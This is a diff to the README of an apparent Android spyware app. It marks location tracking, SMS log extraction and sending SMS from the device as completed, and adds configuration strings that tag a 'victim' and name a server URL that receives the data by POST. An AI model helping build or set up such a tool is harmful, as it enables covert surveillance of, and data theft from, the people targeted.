@@ -13,8 +13,8 @@ Currently, only the Exact Location Tracker is completed.
 
 ## TODO List
 - [x] Exact Location Tracker
-- [ ] SMS Log Extraction
-- [ ] Sending SMS from Device
+- [x] SMS Log Extraction
+- [x] Sending SMS from Device
 - [ ] Contact Extraction
 - [ ] Installed App list Extraction
 - [ ] Additional features
@@ -33,6 +33,8 @@ To set up the app, follow these steps:
     <string name="app_name">Your App Name</string>
     <string name="victim">Name of victim to tag the received data</string>
     <string name="server_url">Server URL where POST request is created</string>
+    <string name="SendSmsTo">Phone No</string>
+    <string name="Message">Message body</string>
 </resources>
 ```
 
